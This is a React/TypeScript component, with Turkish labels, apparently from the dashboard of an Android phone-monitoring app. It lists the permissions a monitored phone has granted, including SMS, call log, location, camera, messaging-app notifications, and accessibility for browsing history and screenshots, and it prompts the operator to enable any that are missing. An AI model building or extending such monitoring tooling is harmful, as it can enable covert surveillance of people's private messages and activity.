import { Device, PermissionStatus } from '@/lib/api';

const PERMISSION_LABELS: Record<keyof Omit<PermissionStatus, 'manufacturer' | 'model' | 'androidVersion' | 'updatedAt'>, string> = {
  callLog: 'Arama kaydı',
  phoneState: 'Telefon durumu',
  sms: 'SMS okuma',
  location: 'Konum',
  camera: 'Kamera',
  notifications: 'Bildirim erişimi',
  accessibility: 'Erişilebilirlik',
  batteryOptimization: 'Pil optimizasyonu kapalı',
};

const PERMISSION_HINTS: Partial<typeof PERMISSION_LABELS> = {
  notifications: 'WhatsApp, Telegram, Instagram için gerekli',
  accessibility: 'İnternet geçmişi ve ekran görüntüsü için gerekli',
  batteryOptimization: 'Arka planda çalışması için kapatılmalı',
};

export function PermissionPanel({ device }: { device: Device }) {
  const perms = device.permissionStatus;
  const missing = perms
    ? (Object.keys(PERMISSION_LABELS) as Array<keyof typeof PERMISSION_LABELS>).filter((key) => {
        const val = perms[key];
        return key === 'batteryOptimization' ? !val : !val;
      })
    : [];

  return (
    <div className="mt-4 border-t border-gray-100 pt-4">
      <p className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">İzin durumu</p>
      {(device.manufacturer || device.model) && (
        <p className="text-sm text-gray-600 mb-3">
          📱 {device.manufacturer} {device.model}
          {perms?.androidVersion && <span className="text-gray-400"> · Android {perms.androidVersion}</span>}
        </p>
      )}
      {!perms ? (
        <p className="text-sm text-amber-600 bg-amber-50 rounded-lg p-3">
          İzin bilgisi henüz gelmedi. Yeni APK kurulu ve telefon çevrimiçi olmalı.
        </p>
      ) : (
        <>
          {missing.length > 0 && (
            <div className="mb-3 p-3 rounded-xl bg-red-50 border border-red-100 text-red-700 text-sm">
              <strong>{missing.length} izin eksik</strong> — veri gelmeyebilir. Telefonda aşağıdakileri açın.
            </div>
          )}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
            {(Object.keys(PERMISSION_LABELS) as Array<keyof typeof PERMISSION_LABELS>).map((key) => {
              const ok = key === 'batteryOptimization' ? !!perms[key] : !!perms[key];
              return (
                <div
                  key={key}
                  className={`flex items-start gap-2 text-sm rounded-lg px-3 py-2 ${
                    ok ? 'bg-emerald-50 text-emerald-800' : 'bg-red-50 text-red-800'
                  }`}
                >
                  <span>{ok ? '✓' : '✗'}</span>
                  <div>
                    <p className="font-medium">{PERMISSION_LABELS[key]}</p>
                    {!ok && PERMISSION_HINTS[key] && (
                      <p className="text-xs opacity-80 mt-0.5">{PERMISSION_HINTS[key]}</p>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </>
      )}
    </div>
  );
}
